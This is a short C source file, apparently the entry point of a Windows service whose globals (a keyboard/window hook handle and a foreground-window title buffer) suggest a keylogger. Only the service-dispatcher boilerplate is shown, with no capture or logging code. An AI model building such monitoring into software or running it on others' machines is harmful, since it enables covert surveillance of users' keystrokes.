#include "winkey.h"

SERVICE_STATUS svcStatus;
SERVICE_STATUS_HANDLE svcStatusHandle;
HANDLE svcStopEvt = NULL; 
HHOOK winHook;
HWND gh_hwndMain;
BOOL foregroundWindowChanged;
char foregroundWindowTitle[4096];

/**
 * @function StartServiceCtrlDispatcher() :
 * Connecte le thread principal d’un processus de service au gestionnaire de contrôle de service,
 * ce qui entraîne le thread comme thread de répartiteur de contrôle de service pour le processus appelant.
 */
int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    SERVICE_TABLE_ENTRY DispatchTable[] = {
        {
            SVC_NAME, (LPSERVICE_MAIN_FUNCTION)SvcMain
        },
        {
            NULL, NULL
        }
    };
    if (!StartServiceCtrlDispatcher(DispatchTable))
        log("[Unable to connect to SCM.]\n", CHAR_MODE, TRUE);
}
